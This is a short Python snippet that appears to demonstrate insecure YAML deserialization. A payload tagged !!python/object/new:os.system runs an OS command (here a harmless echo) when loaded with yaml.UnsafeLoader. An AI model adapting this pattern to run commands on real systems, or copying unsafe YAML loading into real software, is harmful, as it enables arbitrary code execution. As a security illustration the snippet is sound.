import yaml
data = b"""!!python/object/new:os.system [echo EXPLOIT!]"""
# This line execute OS command `echo` embedded into yaml file
deserialized_data = yaml.load(data, Loader=yaml.UnsafeLoader)
